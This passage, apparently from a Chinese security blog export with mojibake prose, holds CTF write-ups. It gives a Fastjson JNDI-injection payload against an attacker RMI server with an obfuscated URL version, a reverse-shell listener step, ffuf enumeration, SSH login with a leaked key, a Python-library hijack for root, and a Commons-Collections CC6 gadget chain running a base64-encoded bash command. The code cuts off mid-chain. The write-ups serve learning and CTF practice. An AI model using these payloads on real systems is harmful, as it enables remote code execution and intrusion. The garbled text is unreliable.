    String s = <span class="string">&quot;&#123;\\&quot;</span><span class="meta">@type</span>\\<span class="string">&quot;:\\&quot;</span>org.apache.xbean.propertyeditor.JndiConverter\\<span class="string">&quot;,\\&quot;</span>AsText\\<span class="string">&quot;:\\&quot;</span>rmi:<span class="comment">//127.0.0.1:1558/Exploit\\&quot;&#125;&quot;;</span></span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°è™½ç„¶æŠ¥é”™äº†ä½†æ˜¯è¿˜æ˜¯æ‰§è¡Œäº†</p>
<p>å¼€æœåŠ¡ï¼š</p>
<blockquote>
<p>java -jar .\ezgadget.jar</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/d2812c6ccb0443539cac5a39f9172e1f.png" alt="Untitled"></p>
<p>RMI &amp; Registry</p>
<p><img src="https://img-blog.csdnimg.cn/70e7d8564daf4702bdd0169915631368.png" alt="Untitled"></p>
<p>æ‰§è¡Œï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/3029cee06c0b4f9f93a4faeba8b3113a.png" alt="Untitled"></p>
<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="ELè¡¨è¾¾å¼"><a href="#ELè¡¨è¾¾å¼" class="headerlink" title="ELè¡¨è¾¾å¼"></a>ELè¡¨è¾¾å¼</h3><p><a href="https://blog.csdn.net/weixin_45890771/article/details/123096972">https://blog.csdn.net/weixin_45890771/article/details/123096972</a></p>
<p>æœ¬åœ°å¼€æœåŠ¡</p>
<p>è‡ªå·±å¤ç°ä¹‹åï¼Œå‘ç°æœ€å…³é”®çš„é—®é¢˜å±…ç„¶æ˜¯execé‡Œé¢çš„å‘½ä»¤å¿…é¡»è¦ç”¨å•å¼•å·åŒ…è£¹ï¼ˆï¼Ÿï¼‰ä¸ºä»€ä¹ˆå‘¢</p>
<p>è·Ÿäº†ä¸€ä¸‹å‘ç°å±…ç„¶åªæ˜¯å› ä¸ºåŒå¼•å·é—­åˆäº†å¯¼è‡´å‘½ä»¤å‡ºé”™äº†ï¼Œä¸ºä»€ä¹ˆåˆ«äººå¯ä»¥å•Šå¯æ¶ï¼ï¼ï¼ï¼</p>
<p><img src="https://img-blog.csdnimg.cn/c9671d230dbe4225a075bf6bebb5f14d.png" alt="Untitled"></p>
<p><img src="https://img-blog.csdnimg.cn/2fc8dfdb09cc4f5ca880c68bbe0537ac.png" alt="Untitled"></p>
<p>å¥½å§è¿˜æ˜¯æŠŠæ•´ä¸ªè¿‡ç¨‹èµ°ä¸€éï¼Œå°±å½“è®°å½•å­¦ä¹ è¿‡ç¨‹äº†</p>
<p>ç›´æ¥åˆ©ç”¨æœ¬åœ°çš„payloadæ‰“æ–­ç‚¹å¼€å§‹è°ƒè¯•ï¼Œè¿™é‡Œæˆ‘ä»¬ååºåˆ—åŒ–çš„å‡½æ•°å’Œé¢˜ç›®ä¸€æ ·åˆ©ç”¨<code>JSON.parseObject</code></p>
<p>å‰é¢å’Œ<a href="https://ameuu.github.io/2022/04/15/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A3/">ä¹‹å‰åˆ†æ</a>è¿‡çš„ä¸€æ ·ï¼Œè¿›å…¥åˆ°äº†<code>DefaultJSONParser#parseObject</code> ï¼Œç»•è¿‡è§£æç©ºæ ¼ä¹‹ç±»çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå¹¶è·å–<code>@type</code></p>
<p>å› ä¸ºå¼€å¯äº†autotypeï¼Œä¼šç›´æ¥è·å–typeNameå¹¶è¿›è¡Œå®ä¾‹åŒ–</p>
<p><img src="https://img-blog.csdnimg.cn/229945e9cd984cd69e9d0230efa12312.png" alt="Untitled"></p>
<p>å¹¶åœ¨åé¢åˆ©ç”¨å¯¹ä¼ å…¥çš„payloadè¿›è¡Œäº†ååºåˆ—åŒ–</p>
<p><img src="https://img-blog.csdnimg.cn/b23d1dd903014c829cbf9796bdd7ddd1.png" alt="Untitled"></p>
<p>ä¹‹åè°ƒç”¨åˆ°<code>DefaultFieldDeserializer#parseField</code> ï¼Œå¯¹å±æ€§çš„å€¼è¿›è¡Œèµ‹å€¼ï¼Œä»è€Œè°ƒç”¨åˆ°äº†<code>DefaultFieldDeserializer#setValue</code> ä¹Ÿå°±ç›¸å½“äºè°ƒç”¨äº†setterå°†rmiçš„payloadèµ‹å€¼ç»™<code>AsText</code></p>
<p><img src="https://img-blog.csdnimg.cn/b30dac05930a432e97aeffcbf32f4696.png" alt="Untitled"></p>
<p>è€Œ<code>AbstractConverter#setAsText</code> ä¸­ä¼šè°ƒç”¨åˆ°<code>toObject</code> ï¼Œè¿™åº”è¯¥å°±æ˜¯å…³é”®ç‚¹äº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setAsText</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.toObject(text.trim());</span><br><span class="line">    <span class="keyword">super</span>.setValue(value);</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­è·Ÿè¿›ä¹‹åå‘ç°ï¼Œåœ¨ä¹‹åè°ƒç”¨åˆ°<code>JndiConverter#toObjectImpl</code> çš„æ—¶å€™ä¼šè°ƒç”¨åˆ°å…³é”®çš„lookupï¼Œè€Œå‚æ•°åˆæ˜¯æˆ‘ä»¬ä¼ è¿›å…¥çš„rmi</p>
<p><img src="https://img-blog.csdnimg.cn/d0ceb3dcc7e74db68c869a1960938c0e.png" alt="Untitled"></p>
<p>è¿›åˆ°äº†expå¼€å¯çš„æ³¨å†ŒæœåŠ¡ï¼Œå¹¶æœç´¢åˆ°ç»‘å®šäº†å­˜åœ¨ä»»æ„å‘½ä»¤ç±»çš„<code>Exploit</code></p>
<p><img src="https://img-blog.csdnimg.cn/78bf0023db0e49ccbdf3dcd9d6bfafcb.png" alt="Untitled"></p>
<p>ä¹‹åé€šè¿‡Referenceç±»ä»å¼€å¯çš„æ³¨å†ŒæœåŠ¡ä¸­è·å–åˆ°äº†æˆ‘ä»¬å­˜æ”¾å¥½çš„æ¶æ„ç±»ï¼Œå¹¶è¯»å–äº†å…¶å†…å®¹ä¹Ÿå°±æ˜¯åŒ…è£¹ç€å‘½ä»¤æ‰§è¡Œçš„å­—ç¬¦ä¸²ï¼ˆæˆ–è®¸è¯´æ˜¯ELè¡¨è¾¾å¼ï¼‰ï¼Œä¹‹åé€šè¿‡å¾ªç¯åˆ¤æ–­keyï¼Œä»è€Œè·å–å†…å®¹ã€‚å½“typeä¸ºä¸å¯çŸ¥çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨åˆ°<code>ELProcessor#eval</code> å‡½æ•°æ‰§è¡Œcontentä»è€Œå®ç°äº†ä»»æ„ä»£ç æ‰§è¡Œ</p>
<p><img src="https://img-blog.csdnimg.cn/4df46415d2bb45c9b5feb33d4cd6c3ce.png" alt="Untitled"></p>
<p><img src="https://img-blog.csdnimg.cn/97414cccb9aa486191e4e93d7c544204.png" alt="Untitled"></p>
<p>è€Œè‡³äºä¸ºä»€ä¹ˆèµ›æ—¶æ²¡æœ‰å‡ºç»“æœï¼Œæ˜¯å› ä¸ºpayloadä¸­ä¸€ç›´ç”¨åˆ°æ˜¯åŒå¼•å·ï¼Œä½†æ˜¯ç”±äºevalä¸­ä¹Ÿç”¨äº†åŒå¼•å·äº†åŒ…è£¹ä»£ç ï¼Œå¯¼è‡´å‘ç”Ÿäº†é—­åˆä»è€Œä¸èƒ½è¯†åˆ«æ•´æ®µä»£ç ï¼Œå½“ç„¶ï¼Œæˆ‘è¿˜æ˜¯ä¸èƒ½ç†è§£ä¸ºä»€ä¹ˆå½“æ—¶çš„ç¯å¢ƒå°±è¿æ²¡æœ‰unicodeçš„æƒ…å†µä¸‹è¿˜æ˜¯æ²¡æœ‰ä»»ä½•å›æ˜¾</p>
<p><img src="https://img-blog.csdnimg.cn/c40b47b649b84789aa20897bb118a077.png" alt="Untitled"></p>
<h2 id="æ›´æ–°-è¿œç¨‹å¤ç°"><a href="#æ›´æ–°-è¿œç¨‹å¤ç°" class="headerlink" title="æ›´æ–°-è¿œç¨‹å¤ç°"></a>æ›´æ–°-è¿œç¨‹å¤ç°</h2><blockquote>
<p>ä¹‹å‰è™½ç„¶æœ¬åœ°æ‰“é€šäº†ï¼Œä½†æ˜¯æŠŠç¯å¢ƒç®€å•éƒ¨ç½²åˆ°CTFDçš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰å¤ç°æˆåŠŸï¼Œæœ€è¿‘å‚åŠ äº†ç¾ŠåŸæ¯å‘ç°äº†é—®é¢˜æ‰€åœ¨ï¼Œé‡æ–°å¤ç°ä¸€ä¸‹ï¼ä½†ç”±äºå®éªŒå®¤ç½‘è¿›ä¸å»ï¼Œå°±éƒ¨ç½²åœ¨äº†è‡ªå·±çš„æœåŠ¡å™¨ä¸Š</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/36fb21093fa44315a3f1cde354464d11.png" alt="image-20220906191751340"></p>
<p>å‰é¢å°±æ ¹æ®hashç¢°æ’å¾—åˆ°å¯¹åº”çš„å­—ç¬¦ä¸²<code>OSpA4iEYU8Winr4X</code>ï¼Œ</p>
<p>åˆ©ç”¨<a href="https://github.com/welk1n/JNDI-Injection-Bypass%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%BC%80%E6%9C%8D%E5%8A%A1">https://github.com/welk1n/JNDI-Injection-Bypasså·¥å…·ï¼Œå¼€æœåŠ¡</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp JNDI-Injection-Bypass-1.0-SNAPSHOT-all.jar payloads.EvilRMIServer ip</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/1764b5a047804322b32090e7c36ae264.png" alt="image-20220906191958901"></p>
<p>çœ‹è¿‡å·¥å…·æºç å¯ä»¥çŸ¥é“å¦‚æœæ˜¯ELå’ŒGroovyçš„è¯ä¼šå¯¹ç›´æ¥æ„é€ åå¼¹shell payloadï¼Œç›´æ¥ç›‘å¬5555ç«¯å£</p>
<p>æœ€ç»ˆpayloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">json?str=OSpA4iEYU8Winr4X&amp;input=%7B%22%40type%22%3A%22org.apache.xbean.propertyeditor.%5Cu004a%5Cu006e%5Cu0064%5Cu0069Converter%22%2C%22AsText%22%3A%22%5Cu0072%5Cu006d%5Cu0069%3A%2F%2Fip%3A1097%2FExecByEL%22%7D</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/495ef4dea42c451ea2d606bde0dd0e0d.png" alt="image-20220906192123824"></p>
<h2 id="å°è®°"><a href="#å°è®°" class="headerlink" title="å°è®°"></a>å°è®°</h2><p>æœ‰æ—¶å€™æ€»ä¼šè¿‡åº¦ä¾èµ–åˆ«äººï¼Œè™½ç„¶ä¼šè‡ªå·±å»éªŒè¯ä¸€äº›äº‹ï¼Œä½†æ˜¯å¦‚æœé‡åˆ°äº†çœ‹èµ·æ¥éš¾ä»¥è§£å†³çš„é—®é¢˜çš„æ—¶å€™å°±ä¼šå¯„å¸Œæœ›äºå…¶ä»–äººï¼Œå®Œå…¨å¦å®šäº†è‡ªå·±çš„èƒ½åŠ›â€¦â€¦</p>
<p>å¸Œæœ›è‡ªå·±èƒ½å¤ŸåšæŒå­¦ä¹ ï¼Œæ‰¾åˆ°å¿—åŒé“åˆçš„webæ‰‹è¿™ç§äº‹å°±éšç¼˜å§ï¼Œç°åœ¨ä¹ŸæŒºå¥½çš„ï¼Œè™½ç„¶è¿›åº¦å¯èƒ½æ¯”è¾ƒæ…¢ä½†æ˜¯è‡³å°‘ä¸ä¼šç»å¸¸åœ¨ä¹åˆ«äººçš„æƒ³æ³•</p>
<p>å¹¶ä¸”æˆ˜é˜Ÿå’Œå›ºå®šå°é˜Ÿé‡Œçš„å¸ˆå‚…é‚£ä¹ˆå‰å®³ï¼Œéš¾å…ä¼šæœ‰ç‚¹ç„¦è™‘ï¼Œä¹Ÿç®—æ˜¯ä¸€ç§åŠ¨åŠ›â€¦â€¦</p>
]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>è“å¸½æ¯</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°ä»æ ¡èµ›å­¦åˆ°çš„æ–°çŸ¥è¯†</title>
    <url>/2022/04/12/%E8%AE%B0%E4%BB%8E%E6%A0%A1%E8%B5%9B%E5%AD%A6%E5%88%B0%E7%9A%84%E6%96%B0%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<blockquote>
<p>æ¸—é€ã€CC6å®é™…åœºæ™¯åˆ©ç”¨åˆä½“éªŒ</p>
</blockquote>
<span id="more"></span>

<h3 id="æ¸—é€"><a href="#æ¸—é€" class="headerlink" title="æ¸—é€"></a>æ¸—é€</h3><p><a href="https://jasonttu.github.io/2022/01/17/VulnHub-Empire-LupinOne/?highlight=fuf#VulnHub-Empire-LupinOne">wp</a></p>
<p><a href="https://blog.csdn.net/weixin_43220532/article/details/116023233">linuxä¸‹sshä½¿ç”¨é™¤äº†22çš„å…¶å®ƒç«¯å£æ¥è¿æ¥è¿œç¨‹æœåŠ¡å™¨_CrystalheartLiçš„åšå®¢-CSDNåšå®¢_linuxé™¤äº†sshè¿˜æœ‰ä»€ä¹ˆèƒ½é“¾æ¥æœåŠ¡å™¨</a></p>
<p>é—®é¢˜ï¼š</p>
<ul>
<li>kalié»˜è®¤è¿æ¥ç«¯å£è¦å¢åŠ 10022</li>
<li>sshkeyæ–‡ä»¶è¦å¢åŠ æƒé™</li>
</ul>
<p>ç®€å•è®°å½•ä¸€ä¸‹ï¼š</p>
<blockquote>
<p>hint:</p>
<p>1.sshè¿æ¥10022</p>
<p>2.ffuf  /~hint</p>
</blockquote>
<p>é¢˜ç›®æœ‰<code>robots.txt</code></p>
<p>è¿›å…¥<code>/~hint/</code>ï¼Œæ˜¯å‡çš„Errorç•Œé¢</p>
<h4 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u http://172.22.236.111:8080/~FUZZ -w /usr/share/wfuzz/wordlist/general/common.txt </span><br></pre></td></tr></table></figure>

<p>æœ‰<code>~secret</code>ï¼Œç”¨æˆ·ä¸º<code>jasontt</code>ï¼Œå¯†ç ä¸º<code>1234</code></p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220409193703147.png" alt="image-20220409193703147"></p>
<p>è¦æ‰¾<code>ssh private key</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u http://172.22.236.111:8080/~secret/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 403 -e .txt,.html,.php</span><br></pre></td></tr></table></figure>

<p>æœ‰<code>secret.txt</code>ï¼Œç§é’¥åœ¨è¿™é‡Œ</p>
<p>base85è§£å¯†ï¼Œå¤åˆ¶é»è´´åˆ°kaliï¼Œæ–°å»ºæ–‡ä»¶<code>sshkey</code></p>
<blockquote>
<p>æ³¨æ„sshç§é’¥çš„æ ¼å¼ åœ¨æœ«å°¾ä¼šæœ‰ä¸€ä¸ªæ¢è¡Œç¬¦</p>
</blockquote>
<p>sshè¿æ¥</p>
<blockquote>
<p>æ³¨æ„æœ¬åœ°çš„ sshd_config é‡Œé¢è¦åŠ ä¸Š10022ç«¯å£</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i sshkey jasontt@172.22.36.111 -p 10022</span><br></pre></td></tr></table></figure>

<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p><a href="https://jasonttu.github.io/2022/01/14/Python%E5%BA%93%E5%8A%AB%E6%8C%81/#more">Pythonåº“åŠ«æŒ</a></p>
<p><code>sudo -l</code>  // æ˜¾ç¤ºå‡ºè‡ªå·±ï¼ˆæ‰§è¡Œ sudo çš„ä½¿ç”¨è€…ï¼‰çš„æƒé™</p>
<p>å¯ä»¥å‘ç°æˆ‘ä»¬æœ‰æ— å¯†ï¼ˆrootï¼‰æƒé™æ‰§è¡Œ</p>
<p>æœ¬åœ°æœ‰<code>Tiquan.py</code>ï¼Œè°ƒç”¨äº†<code>webbrowser.py</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate webbrowser.py</span><br><span class="line"># /usr/lib/python3.8/webbrowser.py</span><br></pre></td></tr></table></figure>

<p>è€Œ<code>webbrowser.py</code>é‡Œé¢æ‰§è¡Œäº†<code>os.system(&quot;/bin/bash&quot;)</code></p>
<blockquote>
<p>èµ›æ—¶åšçš„æ—¶å€™ä¸çŸ¥é“ä¸ºä»€ä¹ˆ æ‰§è¡Œè¿™æ¡å‘½ä»¤çš„æ—¶å€™æ²¡æœ‰æˆåŠŸè¿›å…¥root </p>
<p>èµ›åï¼Œåæ¥å‘ç°os.systemæ²¡æœ‰ ç”¨nanoåŠ äº†ä¸€ä¸‹æ‰è¿›å»</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u root /usr/bin/python3.8 /home/jasontt/Tiquan.py</span><br><span class="line"># è¿›å…¥root</span><br></pre></td></tr></table></figure>

<p>flagåœ¨æ ¹ç›®å½•</p>
<h3 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h3><ul>
<li>java ååºåˆ—åŒ–</li>
</ul>
<h4 id="èµ›å‰"><a href="#èµ›å‰" class="headerlink" title="èµ›å‰:"></a>èµ›å‰:</h4><blockquote>
<p>å› ä¸ºæŸäº›åŸå›  ä¸€ç›´ä»¥ä¸ºæ˜¯tomcatå†…å­˜é©¬ fastjsonå»äº†</p>
</blockquote>
<blockquote>
<p>çœ‹äº†wpå‘ç°åŸæ¥æ²¡æœ‰æƒ³è±¡ä¸­é‚£ä¹ˆéš¾</p>
</blockquote>
<blockquote>
<p>hintæ‰“ä¸å¼€(!!!!!!!!!! ä¹Ÿå®Œå…¨æ‰¾ä¸åˆ°</p>
</blockquote>
<p>åˆæ˜¯ç†Ÿæ‚‰çš„ç™»å½•ç•Œé¢,å°è¯•ä¹‹åå‘ç°ä¸ç®¡ç™»å½•ä»€ä¹ˆéƒ½ä¼šç™»é™†æˆåŠŸ,æ‰€ä»¥åº”è¯¥å’Œè¿™ä¸ªæ²¡ä»€ä¹ˆå…³ç³»</p>
<p>ç„¶åæ‰«äº†ä¸€ä¸‹å‘ç°æœ‰<code>/admin/html</code>,åˆæ˜¯ç™»å½•,ä½†æ˜¯åˆæ˜¯ç™»å½•ä¸æˆåŠŸ</p>
<p>ç„¶åå‘ç°cookieé‡Œé¢æœ‰ä¸€ä¸ªuser,baseè§£å¯†ä¹‹åå¯ä»¥å‘ç°æ˜¯javaåºåˆ—åŒ–ä¹‹åçš„byte,ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥æ˜¯Userç±»åˆusernameå’Œpassword,ç„¶åå°±å¼€å§‹è‡´åŠ›äºä¿®æ”¹cookieå®ç°adminç™»é™†</p>
<p>å¤ªèœäº†,åº”è¯¥èƒ½æƒ³åˆ°cookieæ˜¯å…¥å£çš„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import java.io.*;</span></span><br><span class="line"><span class="keyword">import</span> Utity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(User std)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">        obj.writeObject(std);</span><br><span class="line">        System.out.println(<span class="string">&quot;åºåˆ—åŒ–æˆåŠŸ&quot;</span>);</span><br><span class="line">        obj.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ï¿½ï¿½ sr demo.Studentï¿½ï¿½eï¿½(ï¿½ï¿½ I idC sexL namet Ljava/lang/String;xp   Yst Ameuu</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unSerialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;output.txt&quot;</span>)));</span><br><span class="line">        User o =  (User) objectInputStream.readObject();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">        System.out.println(o.getUsername());</span><br><span class="line">        System.out.println(o.getPassword());</span><br><span class="line">        System.out.println(<span class="string">&quot;ååºåˆ—åŒ–æˆåŠŸ&quot;</span>);</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;rO0ABXNyAApVdGl0eS5Vc2VyaBsf8IrggOECAAJMAAhwYXNzd29yZHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHVzZXJuYW1lcQB+AAF4cHB0AAVhZG1pbg==&quot;</span>);</span><br><span class="line">        System.out.println(code);</span><br><span class="line">        OutputStream out = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">        InputStream is = <span class="keyword">new</span> ByteArrayInputStream(code);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] buff = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>((len=is.read(buff))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.write(buff, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        is.close();</span><br><span class="line"><span class="comment">//        File file = new File(&quot;output.txt&quot;);</span></span><br><span class="line"><span class="comment">//        FileWriter fileWriter = new FileWriter(file.getAbsoluteFile());</span></span><br><span class="line"><span class="comment">//        BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);</span></span><br><span class="line"><span class="comment">//        bufferedWriter.write(String.valueOf(code));</span></span><br><span class="line"><span class="comment">//        bufferedWriter.close();</span></span><br><span class="line"><span class="comment">//        User user = new User();</span></span><br><span class="line"><span class="comment">//        serialize(user);</span></span><br><span class="line">        unSerialize();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        File file = new File(&quot;output.txt&quot;);</span></span><br><span class="line"><span class="comment">//        int size = (int) file.length();</span></span><br><span class="line"><span class="comment">//        byte[] buffer = new byte[size];</span></span><br><span class="line"><span class="comment">//        FileInputStream in = null;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            in = new FileInputStream(file);</span></span><br><span class="line"><span class="comment">//            int len = 0;</span></span><br><span class="line"><span class="comment">//            if ((len = in.available()) &lt;= buffer.length) &#123;</span></span><br><span class="line"><span class="comment">//                in.read(buffer, 0, len);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        catch (Exception e)&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        String base64 = Base64.getEncoder().encodeToString(buffer);</span></span><br><span class="line"><span class="comment">//        System.out.println(base64);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°:"></a>å¤ç°:</h4><p>ï¼ˆä»è¿ç»´é‚£é‡Œæ‹¿äº†docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/97a54f5cd3fb43f3bf7f6825dceed1c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å¼€å§‹ï¼</p>
<p>å› ä¸ºjdkç‰ˆæœ¬æœªçŸ¥ï¼Œæ‰€ä»¥ç”¨CC6çš„pocæ¯”è¾ƒä¿é™©ï¼Œå¯æƒœä¸€å¼€å§‹ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰§è¿·äºCC1äº† æ€ç»´ä¸è¡Œï¼ˆèœ</p>
<p>è¿™é‡Œç”¨çš„æ˜¯Pç¥çš„CC6ï¼Œå‘½ä»¤æ¥è‡ªwpï¼Œæ¯”èµ›çš„æ—¶å€™hintæ²¡æ‰“å¼€</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6ForP</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                Object.class,Object[].class</span><br><span class="line">            &#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash -c &#123;echo,Y2F0IC9mbGFnID4uL3dlYmFwcHMvUk9PVC9mbGFnLnBocA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;bb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        